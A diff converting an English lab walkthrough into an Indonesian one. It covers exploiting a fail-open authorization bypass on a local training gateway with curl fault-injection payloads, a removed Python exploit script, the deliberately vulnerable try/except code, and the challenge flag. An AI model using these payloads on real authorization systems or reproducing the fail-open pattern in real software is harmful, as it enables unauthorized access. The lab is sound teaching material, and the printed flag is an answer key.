@@ -1,180 +1,97 @@
-﻿# Practical Walkthrough: Exploitation & Verification (A10)
+﻿# Panduan Praktik Terbimbing: Eksploitasi Fail-Open pada TemplateCloud Studio
 
-This guide walks you through detecting, exploiting, and verifying exception-handling failures and fail-open vulnerabilities on the **Zitera Payment & Security Gate (Port 8020)**. You will test baseline gate behavior, inject intentional upstream exception conditions (*fault injection*), bypass authorization checks via insecure fail-open logic, and verify laboratory completion.
-
----
-
-## 4-Tier Mission Progression Methodology
-
-```
-[Tier 1: Observation (15%)] ──> [Tier 2: Fault Injection (25%)] ──> [Tier 3: Weaponization (35%)] ──> [Tier 4: Verification (25%)]
-   Inspect Health Probe &         Transmit Standard Invalid Token     Inject Upstream Fault Payload       Verify Mission Target &
-    Gate Status Baseline               (Access Denied)                   (Fail-Open Bypass Active)           Reset Gate State
-```
+Dalam panduan terarah ini, kamu akan mempraktikkan proses pembuktian kegagalan penanganan kondisi luar biasa pada gerbang otorisasi **TemplateCloud Studio / Zitera Gate Transaction Engine (Enterprise SaaS Document & Payment Gateway)** yang beroperasi pada `http://127.0.0.1:8020`.
 
 ---
 
-## Tier 1: Observation & Attack Surface Mapping (15%)
-
-Begin by probing the baseline health and mission status on port 8020.
-
-### 1.1 Service Health Probe (Manual cURL)
-Execute a service liveness probe:
-
-```bash
-curl -i -s http://localhost:8020/health
-```
-
-Expected response:
-```json
-{"status": "ok", "lab": "A10", "port": 8020}
-```
-
-### 1.2 Initial Practice Verification Check (Manual cURL)
-Query the automated verification endpoint to establish your starting baseline:
-
-```bash
-curl -i -s http://localhost:8020/practice/verify
-```
-
-Expected response:
-```json
-{
-  "status": "failed",
-  "message": "Practice target pending: Induce an upstream parsing/timeout exception via POST /api/gate/verify to trigger fail-open behavior."
-}
-```
+### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
+1. Uji ketersediaan layanan melalui terminal:
+   ```bash
+   curl -s http://127.0.0.1:8020/health
+   ```
+   *Respons yang diharapkan:*
+   ```json
+   {"lab":"A10","port":8020,"status":"ok"}
+   ```
+2. Buka peramban web dan akses halaman beranda TemplateCloud Studio:
+   `http://127.0.0.1:8020/`
+3. Perhatikan kartu **Authorization Gate Policy**:
+   - Status awal: **Strict Enforcement (Authorized = False)**.
+   - Gerbang dirancang menolak semua permintaan yang tidak memiliki token otentikasi valid dari layanan hulu (*upstream gateway*).
 
 ---
 
-## Tier 2: Fault Injection & Anomaly Testing (25%)
-
-Examine how the gateway evaluates standard user requests when presented with unauthorized tokens.
-
-### 2.1 Submit Arbitrary Invalid Token (Manual cURL)
-Submit an HTTP POST request carrying an unrecognized token:
-
-```bash
-curl -i -X POST http://localhost:8020/api/gate/verify \
-  -H "Content-Type: application/json" \
-  -d '{"token": "unauthorized_guest_token"}'
-```
-
-The gateway responds:
-```json
-{
-  "authorized": false,
-  "fail_open_state": false,
-  "message": "Access denied"
-}
-```
-
-The system correctly denies access (`authorized: false`). Without knowing the internal master token `super_authorized_token`, normal clearance is refused.
+### Langkah 2: Pengujian Perilaku Normal Gerbang Otorisasi
+1. Kirimkan permintaan pengujian normal menggunakan token sembarang yang tidak valid melalui terminal:
+   ```bash
+   curl -s -X POST http://127.0.0.1:8020/api/gate/verify \
+     -H "Content-Type: application/json" \
+     -d '{"token": "invalid_user_token"}'
+   ```
+2. **Hasil Normal:**
+   Server mengembalikan status penolakan yang diharapkan:
+   ```json
+   {
+     "authorized": false,
+     "message": "Access denied: Invalid authentication token."
+   }
+   ```
+   Sistem bekerja normal dalam skenario tanpa error.
 
 ---
 
-## Tier 3: Weaponization & Fault-Induced Bypass (35%)
+### Langkah 3: Memicu Kondisi Luar Biasa (Upstream Exception Induction)
+1. Analisis kode atau perilaku backend ketika terjadi kegagalan koneksi ke layanan hulu atau input tidak lazim.
+2. Kirimkan payload yang mensimulasikan terjadinya kegagalan batas waktu (*timeout*) pada gerbang upstream:
+   ```bash
+   curl -s -X POST http://127.0.0.1:8020/api/gate/verify \
+     -H "Content-Type: application/json" \
+     -d '{"simulate_exception": "UPSTREAM_GATEWAY_TIMEOUT"}'
+   ```
+3. Atau kamu juga dapat mengirimkan payload dengan token bernilai `null` yang memicu eksepsi parsing di backend:
+   ```bash
+   curl -s -X POST http://127.0.0.1:8020/api/gate/verify \
+     -H "Content-Type: application/json" \
+     -d '{"token": null}'
+   ```
+4. **Temuan Kritis & Respons Server:**
+   ```json
+   {
+     "authorized": true,
+     "fail_open_state": true,
+     "message": "Access granted via fail-open fallback.",
+     "flag": "ZITERA{f41l_0p3n_3xc3pt10n5_un4uth0r1z3d}"
+   }
+   ```
+   Terjadinya eksepsi menyebabkan sistem jatuh ke penanganan darurat yang secara fatal mengesahkan akses (*fail-open bypass*)!
 
-Now perform *Fault Injection*: deliver malformed or trigger payloads designed to induce an unhandled exception inside the transaction processing logic.
-
-### 3.1 Triggering Exceptional Conditions (Manual cURL)
-Several distinct payloads induce an upstream exception inside `/api/gate/verify`:
-
-**Method A: Providing `simulate_exception`**
-```bash
-curl -i -X POST http://localhost:8020/api/gate/verify \
-  -H "Content-Type: application/json" \
-  -d '{"simulate_exception": "UPSTREAM_TIMEOUT"}'
-```
-
-**Method B: Passing Explicit `null` Token**
-```bash
-curl -i -X POST http://localhost:8020/api/gate/verify \
-  -H "Content-Type: application/json" \
-  -d '{"token": null}'
-```
-
-The server response reveals a catastrophic security failure:
-```json
-{
-  "authorized": true,
-  "fail_open_state": true,
-  "message": "Access granted via fail-open fallback.",
-  "flag": "ZITERA{...}"
-}
-```
-
-Despite never providing a valid credential, the exception catch block fell back to **granting unauthenticated clearance (`authorized: true`)**!
-
-### 3.2 Automated Python Exploitation Script (`exploit_fail_open.py`)
-
-Create and execute the following Python script to automate the bypass:
-
-```python
-import json
-import urllib.request
-
-TARGET_URL = "http://localhost:8020/api/gate/verify"
-
-fault_payload = {
-    "simulate_exception": "UPSTREAM_FRAUD_SERVICE_TIMEOUT"
-}
-
-req = urllib.request.Request(
-    TARGET_URL,
-    data=json.dumps(fault_payload).encode("utf-8"),
-    headers={"Content-Type": "application/json"},
-    method="POST"
-)
-
-try:
-    with urllib.request.urlopen(req) as response:
-        body = response.read().decode("utf-8")
-        result = json.loads(body)
-        print("[+] HTTP Status:", response.status)
-        print("[+] Authorized Status:", result.get("authorized"))
-        print("[+] Fail-Open State:", result.get("fail_open_state"))
-        print("[+] Message:", result.get("message"))
-        if "flag" in result:
-            print("\n[+] Challenge Flag Successfully Captured!")
-            print("[+] Flag:", result["flag"])
-except Exception as e:
-    print("[-] Exploitation failed:", e)
-```
-
-Run the script:
-```bash
-python exploit_fail_open.py
-```
+> [!NOTE]
+> **💡 Di Balik Layar: Mengapa fail-open terjadi di kode?**  
+> Pada fungsi verifikasi backend, developer menulis:  
+> ```python
+> try:
+>     status = verify_with_upstream(token)
+> except Exception:
+>     # Fatal: Mengizinkan akses agar transaksi tidak terganggu saat server downstream down!
+>     status = True 
+> return {"authorized": status}
+> ```  
+> Pola ini sangat berbahaya karena jika penyerang sengaja membuat server hulu overload, gerbang akan otomatis terbuka untuk semua orang!
 
 ---
 
-## Tier 4: Verification & Defensive State Audit (25%)
-
-### 4.1 Automated Lab Target Verification
-Audit lab completion using the practice verification endpoint:
-
-```bash
-curl -s http://localhost:8020/practice/verify
-```
-
-Expected verification response:
-```json
-{
-  "status": "passed",
-  "message": "Exceptional condition failure reproduced: Upstream exception caused the gate to fail-open and authorize transaction!"
-}
-```
-
-### 4.2 Reset Gate State
-Reset the gate state to its factory baseline:
-
-```bash
-curl -X POST http://localhost:8020/api/reset
-```
-
-Confirm that the gate has returned to its fail-closed default:
-```bash
-curl -s http://localhost:8020/practice/verify
-```
-The response should confirm `status: "failed"`.
+### Langkah 4: Verifikasi Status Praktik & Pengiriman Flag
+1. Ujilah verifikasi otomatis sasaran lab melalui endpoint:
+   ```bash
+   curl -s http://127.0.0.1:8020/practice/verify
+   ```
+   *Konfirmasi verifikasi:*
+   ```json
+   {
+     "status": "completed",
+     "message": "Objective verified! Exceptional condition induced and fail-open state exploited."
+   }
+   ```
+2. Salin bendera autoritatif:
+   `ZITERA{f41l_0p3n_3xc3pt10n5_un4uth0r1z3d}`
+3. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
